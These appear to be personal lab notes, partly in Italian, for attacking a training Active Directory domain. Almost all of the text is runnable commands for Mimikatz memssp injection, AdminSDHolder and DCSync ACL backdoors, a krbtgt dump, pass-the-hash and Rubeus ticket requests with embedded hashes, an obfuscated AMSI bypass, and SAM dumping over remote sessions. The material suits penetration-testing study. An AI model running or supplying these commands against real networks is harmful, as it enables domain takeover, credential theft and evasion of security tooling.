*tools*
- [samratashok/ADModule: Microsoft signed ActiveDirectory PowerShell module (github.com)](https://github.com/samratashok/ADModule)
- [samratashok/RACE: RACE is a PowerShell module for executing ACL attacks against Windows targets. (github.com)](https://github.com/samratashok/RACE)
- [PowershellMafia/PowerView (github.com)](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### **CUSTOM SSP**
*With MimiKatz*
o uso di mimilib.dll o 
```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```
### **ACLs – AdminSDHolder**
Modifica le acl per aggiungerti il permesso di full control sull'user
*Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA*
```PowerView
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose
```
*Using ActiveDirectory Module and Set-ADACL*
```AD_module
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,D C=local' -Principal student1 -Verbose
```
*Use of race toolkit*
```AD_module
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```


### **ACLs – Right Abuse**
*Add FullControl rights*
Usando powershell
```Powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' - PrincipalSamAccountName student1 -Rights All -Verbose
```
Using ActiveDirectory Module and Set-ADACL
```AD_module
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
```
*Add rights for DCSync*
usando powershell
```Powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' - PrincipalSamAccountName student1 -Rights DCSync -Verbose
```
Using ActiveDirectory Module and Set-ADACL
```AD_module
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose
```
Poi avvia DCSync  con mimikatz
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

To persistence on dcorp-dc we can abuse the DSRM service.
Firtsly dump the hashes from the dc
Open a session on the dc
```powershell
. C:\AD\Tools\Invoke-Mimi.ps1
```
```powershell
Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"'
```
or using Rubeus
```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Launch Invishell e establish the session
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```powershell
$sess = New-PSSession dcorp-dc
```
Bypass the AMSI
```powershell
Enter-PSSession -Session $sess
```
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
```powershell
exit
```
Load and launch Invoke-Mimi
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```
```powershell
Enter-PSSession -Session $sess
```
```powershell
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
```